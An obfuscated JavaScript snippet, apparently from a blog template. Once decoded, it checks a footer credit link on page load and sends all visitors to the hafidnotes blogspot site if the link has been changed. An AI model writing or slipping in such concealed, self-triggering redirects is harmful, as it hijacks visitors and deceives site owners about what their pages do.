...
eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(9).d(a(){c($("#1-2,.1-2").b("3")!="0://4.5.6.7.8"){e.f.3="0://4.5.6.7.8"}});',16,16,'http|bottom|footer|href|www|hafidnotes|blogspot|co|id|document|function|attr|if|ready|window|location'.split('|'),0,{}));
